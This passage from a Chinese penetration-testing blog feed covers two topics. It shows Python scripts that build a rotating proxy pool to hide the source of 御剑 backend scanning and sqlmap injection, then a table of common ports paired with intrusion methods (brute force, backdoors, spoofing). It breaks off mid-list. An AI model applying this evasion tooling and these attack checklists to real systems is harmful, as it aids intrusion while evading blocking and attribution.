class="string">&#x27;false&#x27;</span>)</span><br><span class="line">    Encryption <span class="operator">=</span> ElementTree.SubElement(Options, &quot;ProcessOtherUsers&quot;)</span><br><span class="line">    Encryption.set(&quot;enabled&quot;, <span class="string">&#x27;false&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    # ProxyList</span><br><span class="line">    ProxyList <span class="operator">=</span> ElementTree.SubElement(ProxifierProfile, &quot;ProxyList&quot;)</span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> data:</span><br><span class="line">        i <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span>  # 从<span class="number">101</span>开始增加</span><br><span class="line">        # ProxyList.Proxy</span><br><span class="line">        Proxy <span class="operator">=</span> ElementTree.SubElement(ProxyList, &quot;Proxy&quot;)</span><br><span class="line">        Proxy.set(&quot;id&quot;, str(i))</span><br><span class="line"></span><br><span class="line">        if <span class="keyword">not</span> temp[<span class="string">&#x27;https&#x27;</span>]:</span><br><span class="line">            Proxy.set(&quot;type&quot;, &quot;HTTP&quot;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Proxy.set(&quot;type&quot;, &quot;HTTPS&quot;)</span><br><span class="line">            Proxy.text <span class="operator">=</span> str(i)</span><br><span class="line">            ProxyIDList.append(i)</span><br><span class="line"></span><br><span class="line">        # ProxyList.Proxy.Address</span><br><span class="line">        Address <span class="operator">=</span> ElementTree.SubElement(Proxy, &quot;Address&quot;)</span><br><span class="line">        Address.text <span class="operator">=</span> temp[<span class="string">&#x27;proxy&#x27;</span>].split(&quot;:&quot;, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        # ProxyList.Proxy.Port</span><br><span class="line">        Port <span class="operator">=</span> ElementTree.SubElement(Proxy, &quot;Port&quot;)</span><br><span class="line">        Port.text <span class="operator">=</span> temp[<span class="string">&#x27;proxy&#x27;</span>].split(&quot;:&quot;, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        # ProxyList.Proxy.Options</span><br><span class="line">        Options <span class="operator">=</span> ElementTree.SubElement(Proxy, &quot;Options&quot;)</span><br><span class="line">        Options.text <span class="operator">=</span> &quot;48&quot;</span><br><span class="line"></span><br><span class="line">    # RuleList</span><br><span class="line">    ChainList <span class="operator">=</span> ElementTree.SubElement(ProxifierProfile, &quot;ChainList&quot;)</span><br><span class="line"></span><br><span class="line">    # RuleList.Chain</span><br><span class="line">    Chain <span class="operator">=</span> ElementTree.SubElement(ChainList, &quot;Chain&quot;)</span><br><span class="line">    Chain.set(&quot;id&quot;, str(i))</span><br><span class="line">    Chain.set(&quot;type&quot;, &quot;simple&quot;)</span><br><span class="line"></span><br><span class="line">    # RuleList.Chain.Name</span><br><span class="line">    Name <span class="operator">=</span> ElementTree.SubElement(Chain, &quot;Name&quot;)</span><br><span class="line">    Name.text<span class="operator">=</span>&quot;AgentPool&quot;</span><br><span class="line"></span><br><span class="line">    # RuleList.Chain.Proxy</span><br><span class="line">    <span class="keyword">for</span> temp_id <span class="keyword">in</span> ProxyIDList:</span><br><span class="line">        Proxy <span class="operator">=</span> ElementTree.SubElement(Chain, &quot;Proxy&quot;)</span><br><span class="line">        Proxy.set(&quot;enabled&quot;, &quot;true&quot;)</span><br><span class="line">        Proxy.text<span class="operator">=</span>str(temp_id)</span><br><span class="line">    # RuleList</span><br><span class="line">    RuleList <span class="operator">=</span> ElementTree.SubElement(ProxifierProfile, &quot;RuleList&quot;)</span><br><span class="line"></span><br><span class="line">    # Rule</span><br><span class="line">    Rule <span class="operator">=</span> ElementTree.SubElement(RuleList, &quot;Rule&quot;)</span><br><span class="line">    Rule.set(&quot;enabled&quot;, &quot;true&quot;)</span><br><span class="line">    Name <span class="operator">=</span> ElementTree.SubElement(Rule,&quot;Name&quot;)</span><br><span class="line">    Applications <span class="operator">=</span> ElementTree.SubElement(Rule,&quot;Applications&quot;)</span><br><span class="line">    Action <span class="operator">=</span> ElementTree.SubElement(Rule,&quot;Action&quot;)</span><br><span class="line"></span><br><span class="line">    Name.text<span class="operator">=</span>&quot;御剑后台扫描工具.exe [auto-created]&quot;</span><br><span class="line">    Applications.text<span class="operator">=</span>&quot;御剑后台扫描工具.exe&quot;</span><br><span class="line">    Action.set(&quot;type&quot;,&quot;Direct&quot;)</span><br><span class="line"></span><br><span class="line">    # Rule</span><br><span class="line">    Rule <span class="operator">=</span> ElementTree.SubElement(RuleList, &quot;Rule&quot;)</span><br><span class="line">    Rule.set(&quot;enabled&quot;, &quot;true&quot;)</span><br><span class="line">    Name <span class="operator">=</span> ElementTree.SubElement(Rule,&quot;Name&quot;)</span><br><span class="line">    Targets <span class="operator">=</span> ElementTree.SubElement(Rule,&quot;Targets&quot;)</span><br><span class="line">    Action <span class="operator">=</span> ElementTree.SubElement(Rule,&quot;Action&quot;)</span><br><span class="line"></span><br><span class="line">    Name.text<span class="operator">=</span>&quot;Localhost&quot;</span><br><span class="line">    Targets.text<span class="operator">=</span>&quot;localhost; 127.0.0.1; %ComputerName%&quot;</span><br><span class="line">    Action.set(&quot;type&quot;, &quot;Direct&quot;)</span><br><span class="line"></span><br><span class="line">    # Rule</span><br><span class="line">    Rule <span class="operator">=</span> ElementTree.SubElement(RuleList, &quot;Rule&quot;)</span><br><span class="line">    Rule.set(&quot;enabled&quot;, &quot;true&quot;)</span><br><span class="line">    Name <span class="operator">=</span> ElementTree.SubElement(Rule, &quot;Name&quot;)</span><br><span class="line">    Action <span class="operator">=</span> ElementTree.SubElement(Rule, &quot;Action&quot;)</span><br><span class="line">    Name.text <span class="operator">=</span> &quot;Default&quot;</span><br><span class="line">    Action.text <span class="operator">=</span> &quot;102&quot;</span><br><span class="line">    Action.set(&quot;type&quot;, &quot;Proxy&quot;)</span><br><span class="line"></span><br><span class="line">    tree <span class="operator">=</span> ElementTree.ElementTree(ProxifierProfile)</span><br><span class="line">    tree.write(&quot;ProxifierConf.ppx&quot;, encoding<span class="operator">=</span>&quot;UTF-8&quot;, xml_declaration<span class="operator">=</span><span class="literal">True</span>)</span><br><span class="line">if __name__ <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    proxy_data <span class="operator">=</span> RedisProxyGet()</span><br><span class="line">    xmlOutputs(proxy_data)</span><br><span class="line">    print(&quot;ProxifierConf.ppx配置文件创建完成....&quot;)</span><br></pre></td></tr></table></figure><p>步骤三：开启 HTTP 代理并双击下载好的配置文件进行导入…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631431386137-df048bb6-dd73-44c9-a610-cf6f82b1f4dd.png" alt="img"><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631431441260-ca12a79e-12af-4720-8e37-b69fe18f45c9.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631431698358-fe214d95-c4e2-4147-b1c2-7ded83b67193.png" alt="img"></p><p>步骤四：使用扫描软件走代理池进行扫描… 扫描效果并不是很好…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631432130710-fd2f3bea-a82e-42e9-a5b8-3ee5c2cb360b.png" alt="img"></p><p>步骤五：使用其中的 HTTPS 代理发现效果不错…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631432311899-58d01dae-f8d5-4e6f-b4a8-6aa47fbc924f.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631432767468-cd63f08d-3c22-46ed-8605-2598be7d7281.png" alt="img"></p><h3 id="32sqlmap代理池"><a class="markdownIt-Anchor" href="#32sqlmap代理池">#</a> 3.2：SQLMAP 代理池</h3><p>程序编写思路：</p><ol><li>先爬取代理网站的代理 IP，然后做一下验证，验证是否可用并输出到文本里。</li><li>启用本地代理 127.0.0.1:5320</li><li>sqlmap 加上代理 “ <strong>–proxy = http：<a href="//127.0.0.1">//127.0.0.1</a>：5320”</strong></li></ol><p><strong>步骤一：执行一下代码进行代理地址采集…</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">###执行命令</span><br><span class="line">python39 getproxy.py <span class="operator">&gt;</span> ip.txt</span><br><span class="line">###getproxy.py代码</span><br><span class="line">#<span class="operator">/</span>usr<span class="operator">/</span>bin<span class="operator">/</span>python3</span><br><span class="line">#author:Jaky</span><br><span class="line"> </span><br><span class="line">import requests,re</span><br><span class="line"> </span><br><span class="line">url<span class="operator">=</span>&quot;http://www.89ip.cn/tqdl.html?api=1&amp;num=9000&quot;#采用<span class="number">89</span>ip的接口采集</span><br><span class="line">types<span class="operator">=</span>&quot;https&quot;</span><br><span class="line">proxys<span class="operator">=</span>&#123;&#125;</span><br><span class="line">headers<span class="operator">=</span>&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)&#x27;</span>&#125;</span><br><span class="line">r<span class="operator">=</span>requests.get(url,headers<span class="operator">=</span>headers).text</span><br><span class="line">ip<span class="operator">=</span>re.findall(&quot;((?:[0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;)&quot;, r)#正则匹配出IP与端口</span><br><span class="line">port<span class="operator">=</span>re.findall(&quot;(:\d&#123;1,5&#125;)&quot;, r)#正则匹配出IP与端口</span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> zip(port[<span class="number">2</span>:],ip):</span><br><span class="line">  proxy<span class="operator">=</span>j<span class="operator">+</span>i</span><br><span class="line">  print (proxy)</span><br><span class="line">  proxys[types.<span class="built_in">lower</span>()]<span class="operator">=</span><span class="string">&#x27;%s&#x27;</span><span class="operator">%</span>proxy</span><br><span class="line">  try:</span><br><span class="line">    tar<span class="operator">=</span>requests.get(&quot;https://ifconfig.me/ip&quot;,headers<span class="operator">=</span>headers,proxies<span class="operator">=</span>proxys,timeout<span class="operator">=</span><span class="number">5</span>,verify<span class="operator">=</span><span class="literal">False</span>).text</span><br><span class="line">    if tar <span class="keyword">in</span> str(proxys):</span><br><span class="line">      <span class="keyword">with</span> <span class="keyword">open</span>(&quot;ip.txt&quot;,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> file: file.write(proxy<span class="operator">+</span><span class="string">&#x27;\n&#x27;</span>) # 保存文件</span><br><span class="line">  <span class="keyword">except</span> :</span><br><span class="line">    pass </span><br></pre></td></tr></table></figure><p>步骤二：执行一下代码并开启本地通往代理服务器的链接…</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">###执行代码</span><br><span class="line">python39 startproxy.py</span><br><span class="line">#<span class="operator">!</span><span class="operator">/</span>usr<span class="operator">/</span>bin<span class="operator">/</span>env python3</span><br><span class="line"># coding:utf<span class="number">-8</span></span><br><span class="line"> </span><br><span class="line">import socket,<span class="type">time</span>,random,threading,requests,re</span><br><span class="line"><span class="keyword">from</span> socket import error</span><br><span class="line"> </span><br><span class="line"><span class="built_in">localtime</span> <span class="operator">=</span> time.asctime(time.localtime(time.time()))</span><br><span class="line"> </span><br><span class="line">class ProxyServerTest():</span><br><span class="line">    def __init__(self, proxyip):</span><br><span class="line">        # 本地socket服务</span><br><span class="line">        self.ser <span class="operator">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.proxyip <span class="operator">=</span> proxyip</span><br><span class="line">         </span><br><span class="line">    def run(self):</span><br><span class="line">        try:</span><br><span class="line">            # 本地服务IP和端口</span><br><span class="line">            self.ser.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">5320</span>))</span><br><span class="line">            # 最大连接数</span><br><span class="line">            self.ser.listen(<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">            print(&quot;[-]The local service : &quot; <span class="operator">+</span> str(e))</span><br><span class="line">            <span class="keyword">return</span> &quot;[-]The local service : &quot; <span class="operator">+</span> str(e)</span><br><span class="line"> </span><br><span class="line">        while <span class="literal">True</span>:</span><br><span class="line">            try:</span><br><span class="line">                # 接收客户端数据</span><br><span class="line">                client, addr <span class="operator">=</span> self.ser.accept()</span><br><span class="line">                print(<span class="string">&#x27;[*]accept %s connect&#x27;</span> <span class="operator">%</span> (addr,))</span><br><span class="line">                data <span class="operator">=</span> client.recv(<span class="number">1024</span>)</span><br><span class="line">                if <span class="keyword">not</span> data:</span><br><span class="line">                    break</span><br><span class="line">                print(<span class="string">&#x27;[*&#x27;</span> <span class="operator">+</span> <span class="built_in">localtime</span> <span class="operator">+</span> <span class="string">&#x27;]: Accept data...&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">                print(&quot;[-]Local receiving client : &quot; <span class="operator">+</span> str(e))</span><br><span class="line">                <span class="keyword">return</span> &quot;[-]Local receiving client : &quot; <span class="operator">+</span> str(e)</span><br><span class="line"> </span><br><span class="line">            while <span class="literal">True</span>:</span><br><span class="line">                # 目标代理服务器，将客户端接收数据转发给代理服务器</span><br><span class="line">                mbsocket <span class="operator">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">                print(&quot;[!]Now proxy ip:&quot; <span class="operator">+</span> str(self.proxyip))</span><br><span class="line">                prip <span class="operator">=</span> self.proxyip[<span class="number">0</span>]</span><br><span class="line">                prpo <span class="operator">=</span> self.proxyip[<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">                try:</span><br><span class="line">                    mbsocket.settimeout(<span class="number">3</span>)</span><br><span class="line">                    mbsocket.connect((prip, prpo))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print(&quot;[-]RE_Connect...&quot;)</span><br><span class="line">                    continue</span><br><span class="line">                break</span><br><span class="line"> </span><br><span class="line">            try:</span><br><span class="line">                mbsocket.send(data)</span><br><span class="line">            <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">                print(&quot;[-]Sent to the proxy server : &quot; <span class="operator">+</span> str(e))</span><br><span class="line">                <span class="keyword">return</span> &quot;[-]Sent to the proxy server : &quot; <span class="operator">+</span> str(e)</span><br><span class="line"> </span><br><span class="line">            while <span class="literal">True</span>:</span><br><span class="line">                try:</span><br><span class="line">                    # 从代理服务器接收数据，然后转发回客户端</span><br><span class="line">                    data_1 <span class="operator">=</span> mbsocket.recv(<span class="number">1024</span>)</span><br><span class="line">                    if <span class="keyword">not</span> data_1:</span><br><span class="line">                        break</span><br><span class="line">                    print(<span class="string">&#x27;[*&#x27;</span> <span class="operator">+</span> <span class="built_in">localtime</span> <span class="operator">+</span> <span class="string">&#x27;]: Send data...&#x27;</span>)</span><br><span class="line">                    client.send(data_1)</span><br><span class="line">                <span class="keyword">except</span> socket.timeout <span class="keyword">as</span> e:</span><br><span class="line">                    print(self. proxyip)</span><br><span class="line">                    print(&quot;[-]Back to the client : &quot; <span class="operator">+</span> str(e))</span><br><span class="line">                    continue</span><br><span class="line">            # 关闭连接</span><br><span class="line">        client.close()</span><br><span class="line">        mbsocket.close()</span><br><span class="line">           </span><br><span class="line">def main():</span><br><span class="line">    print(<span class="string">&#x27;Atuhor:Jaky&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;WeChat public number:luomiweixiong&#x27;</span>)</span><br><span class="line">    file <span class="operator">=</span> <span class="keyword">open</span>(&quot;ip.txt&quot;,&quot;r&quot;)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> file:</span><br><span class="line">        ip <span class="operator">=</span> i.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        ip_list <span class="operator">=</span> (ip[<span class="number">0</span>],<span class="type">int</span>(ip[<span class="number">1</span>]))</span><br><span class="line">        print(ip_list)</span><br><span class="line"> </span><br><span class="line">        try:</span><br><span class="line">            try_ip <span class="operator">=</span> ProxyServerTest(ip_list)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(&quot;[-]main : &quot; <span class="operator">+</span> str(e))</span><br><span class="line">            <span class="keyword">return</span> &quot;[-]main : &quot; <span class="operator">+</span> str(e)</span><br><span class="line"> </span><br><span class="line">    t <span class="operator">=</span> threading.Thread(target<span class="operator">=</span>try_ip.run, name<span class="operator">=</span><span class="string">&#x27;LoveJaky&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;[*]Waiting for connection...&#x27;</span>)</span><br><span class="line">    # 关闭多线程</span><br><span class="line">    t.start()</span><br><span class="line">    t.join()</span><br><span class="line">     </span><br><span class="line">if __name__ <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>步骤三：打开 SQLMAP 使用一下命令开始使用代理池进行注入…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1631435839588-8722c9ce-ade6-4ee9-b67f-6e280d849564.png" alt="img"></p><ul><li>其他工具参照工具包说明…</li></ul><h3 id="33其他工具"><a class="markdownIt-Anchor" href="#33其他工具">#</a> 3.3：其他工具</h3><p>proxychains</p><h1 id="四收费代理池"><a class="markdownIt-Anchor" href="#四收费代理池">#</a> 四：收费代理池</h1><iframe style="width: 1px; height: 1px; position: absolute; left: -100px; bottom: -100px; display: none;" src="https://tracert.alipay.com/cross.html"></iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;代理池技术&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#代理池技术&quot;&gt;#&lt;/a&gt; 代理池技术&lt;/h1&gt;
&lt;h1 id=&quot;一技术介绍&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一技术介绍&quot;&gt;#&lt;/a&gt; 一</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/%E9%BB%91%E5%AE%A2%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3/"/>
    <id>https://sun-spots.github.io/2022/03/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/%E9%BB%91%E5%AE%A2%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3/</id>
    <published>2022-03-09T01:01:08.427Z</published>
    <updated>2022-03-09T01:02:17.242Z</updated>
    
    <content type="html"><![CDATA[<h1 id="黑客常用端口"><a class="markdownIt-Anchor" href="#黑客常用端口">#</a> 黑客常用端口</h1><table><thead><tr><th>端口</th><th>服务</th><th>入侵方式</th></tr></thead><tbody><tr><td>21</td><td>ftp/tftp/vsftpd 文件传输协议</td><td>爆破 / 嗅探 / 溢出 / 后门</td></tr><tr><td>22</td><td>ssh 远程连接</td><td>爆破 /openssh 漏洞</td></tr><tr><td>23</td><td>Telnet 远程连接</td><td>爆破 / 嗅探 / 弱口令</td></tr><tr><td>25</td><td>SMTP 邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS 域名解析系统</td><td>域传送 / 劫持 / 缓存投毒 / 欺骗</td></tr><tr><td>67/68</td><td>dhcp 服务</td><td>劫持 / 欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破 / 嗅探</td></tr><tr><td>139</td><td>Samba 服务</td><td>爆破 / 未授权访问 / 远程命令执行</td></tr><tr><td>143</td><td>Imap 协议</td><td>爆破</td></tr><tr><td>161</td><td>SNMP 协议</td><td>爆破 / 搜集目标内网信息</td></tr><tr><td>389</td><td>Ldap 目录访问协议</td><td>注入 / 未授权访问 / 弱口令</td></tr><tr><td>445</td><td>smb</td><td>ms17-010 / 端口溢出</td></tr><tr><td>512/513/514</td><td>Linux Rexec 服务</td><td>爆破 / Rlogin 登陆</td></tr><tr><td>873</td><td>Rsync 服务</td><td>文件上传 / 未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破</td></tr><tr><td>1352</td><td>Lotus domino 邮件服务</td><td>爆破 / 信息泄漏</td></tr><tr><td>1433</td><td>mssql</td><td>爆破 / 注入 / SA 弱口令</td></tr><tr><td>1521</td><td>oracle</td><td>爆破 / 注入 / TNS 爆破 / 反弹 shell</td></tr><tr><td>2049</td><td>Nfs 服务</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper 服务</td><td>未授权访问</td></tr><tr><td>2375</td><td>docker remote api</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破 / 注入</td></tr><tr><td>3389</td><td>Rdp 远程桌面链接</td><td>爆破 /shift 后门</td></tr><tr><td>4848</td><td>GlassFish 控制台</td><td>爆破 / 认证绕过</td></tr><tr><td>5000</td><td>sybase/DB2 数据库</td><td>爆破 / 注入 / 提权</td></tr><tr><td>5432</td><td>postgresql</td><td>爆破 / 注入 / 缓冲区溢出</td></tr><tr><td>5632</td><td>pcanywhere 服务</td><td>抓密码 / 代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破 / 认证绕过</td></tr><tr><td>6379</td><td>Redis 数据库</td><td>未授权访问 / 爆破</td></tr><tr><td>7001/7002</td><td>weblogic</td><td>java 反序列化 / 控制台弱口令</td></tr><tr><td>80/443</td><td>http/https</td><td>web 应用漏洞 / 心脏滴血</td></tr><tr><td>8069</td><td>zabbix 服务</td><td>远程命令执行 / 注入</td></tr><tr><td>8161</td><td>activemq</td><td>弱口令 / 写文件</td></tr><tr><td>8080/8089</td><td>Jboss/Tomcat/Resin</td><td>爆破 / PUT 文件上传 / 反序列化</td></tr><tr><td>8083/8086</td><td>influxDB</td><td>未授权访问</td></tr><tr><td>9000</td><td>fastcgi</td><td>远程命令执行</td></tr><tr><td>9090</td><td>Websphere 控制台</td><td>爆破 /java 反序列化 / 弱口令</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcached</td><td>未授权访问</td></tr><tr><td>27017/27018</td><td>mongodb</td><td>未授权访问 / 爆破</td></tr></tbody></table><p><strong>21**** 端口渗透剖析</strong></p><p>FTP 通常用作对远程服务器进行管理，典型应用就是对 web 系统进行管理。一旦 FTP 密码泄露就直接威胁 web 系统安全，甚至黑客通过提权可以直接控制服务器。这里剖析渗透 FTP 服务器的几种方法。</p><p>（1）基础爆破：ftp 爆破工具很多，这里我推 owasp 的 Bruter,hydra 以及 msf 中的 ftp 爆破模块。</p><p>（2) ftp 匿名访问：用户名：anonymous 密码：为空或者任意邮箱</p><p>（3）后门 vsftpd ：version 2 到 2.3.4 存在后门漏洞，攻击者可以通过该漏洞获取 root 权限。（https://<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLw==">www.freebuf</span>.com/column/143480.html）</p><p>（4）嗅探：ftp 使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）, 使用 Cain 进行渗透。</p><p>（5）ftp 远程代码溢出。（https://<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2VpeGluXzQyMjE0MjczL2FydGljbGUvZGV0YWlscy8=">blog.csdn.net/weixin_42214273/article/details/</span>82892282）（6）ftp 跳转攻击。（https://<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvbWd4Y29vbC9hcnRpY2xlL2RldGFpbHMv">blog.csdn.net/mgxcool/article/details/</span>48249473）</p><p><strong>22**** 端口渗透剖析</strong></p><p>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p><p>（1）弱口令，可使用工具 hydra，msf 中的 ssh 爆破模块。</p><p>（2）防火墙 SSH 后门。（https://<span class="exturl" data-url="aHR0cDovL3d3dy5zZWNwdWxzZS8=">www.secpulse</span>.com/archives/69093.html）</p><p>（3）28 退格 OpenSSL</p><p>（4）openssh 用户枚举 CVE-2018-15473。（https://<span class="exturl" data-url="aHR0cDovL3d3dy5hbnF1YW5rZS8=">www.anquanke</span>.com/post/id/157607）</p><p><strong>23**** 端口渗透剖析</strong></p><p>telnet 是一种旧的远程管理方式，使用 telnet 工具登录系统过程中，网络上传输的用户和密码都是以明文方式传送的，黑客可使用嗅探技术截获到此类密码。</p><p>（1）暴力破解技术是常用的技术，使用 hydra, 或者 msf 中 telnet 模块对其进行破解。</p><p>（2）在 linux 系统中一般采用 SSH 进行远程访问，传输的敏感数据都是经过加密的。而对于 windows 下的 telnet 来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用 cain 等嗅探工具可轻松截获远程登录密码。</p><p><strong>25/465**** 端口渗透剖析</strong></p><p>smtp：邮件协议，在 linux 中默认开启这个服务，可以向对方发送钓鱼邮件</p><p>默认端口：25（smtp）、465（smtps）</p><p>（1）爆破：弱口令</p><p>（2）未授权访问</p><p><strong>53**** 端口渗透剖析</strong></p><p>53 端口是 DNS 域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。</p><p>（1）使用 DNS 远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（https://<span class="exturl" data-url="aHR0cDovL3d3dy5zZWVidWcub3JnL3Z1bGRiL3NzdmlkLQ==">www.seebug.org/vuldb/ssvid-</span>96718）</p><p>（2）使用 DNS 欺骗攻击，可对 DNS 域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（<span class="exturl" data-url="aHR0cHM6Ly9iYWlqaWFoYW8uYmFpZHUuY29tL3M/aWQ9MTU3NzM2MjQzMjk4Nzc0OTcwNiZhbXA7d2ZyPXNwaWRlciZhbXA7Zm9yPXBjJUVGJUJDJTg5">https://baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc）</span></p><p>（3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其 DNS 服务器。将导致用该服务器进行域名解析的用户无法正常上网。（<span class="exturl" data-url="aHR0cDovL3d3dy5lZHUv">http://www.edu</span>.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）（4）DNS 劫持。（https://<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzI0NDczMDEvYXJ0aWNsZS9kZXRhaWxzLw==">blog.csdn.net/qq_32447301/article/details/</span>77542474）</p><p><strong>80**** 端口渗透剖析</strong> 80 端口通常提供 web 服务。目前黑客对 80 端口的攻击典型是采用 SQL 注入的攻击方法，脚本渗透技术也是一项综合性极高的 web 